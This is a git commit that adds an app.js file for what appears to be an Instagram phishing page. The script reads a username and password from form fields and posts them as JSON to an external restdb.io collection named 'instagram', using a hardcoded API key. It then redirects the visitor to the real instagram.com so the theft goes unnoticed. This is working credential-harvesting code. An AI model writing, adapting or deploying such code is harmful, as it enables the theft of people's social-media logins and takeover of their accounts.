47a18383b680f12ce7ada19583ebed08bed9ba97
mhd-radin <radinpaliyalill@gmail.com>
2025-01-21 19:54:46 +0530

    update

---
+++ app.js
@@ -0,0 +1,33 @@
+document.addEventListener('DOMContentLoaded', function() {
+  setTimeout(function() {
+    document.querySelector('.loading').style.display = 'none'
+  }, 1200)
+})
+
+
+function send() {
+  let id = document.getElementById('igid').value;
+  let pw = document.getElementById('pw').value;
+  
+  var xhr = new XMLHttpRequest();
+  xhr.withCredentials = false;
+
+  xhr.addEventListener("readystatechange", function() {
+    if (this.readyState === 4) {
+      location.href = 'https://instagram.com'
+    }
+  });
+
+  xhr.open(
+    "POST",
+    "https://grean-9ebb.restdb.io/rest/" + 'instagram'
+  );
+  xhr.setRequestHeader("content-type", "application/json");
+  xhr.setRequestHeader("x-apikey", '64336d2939cf552ef728c0e1');
+  xhr.setRequestHeader("cache-control", "no-cache");
+
+  xhr.send(JSON.stringify({
+    id,
+    pw
+  }));
+}
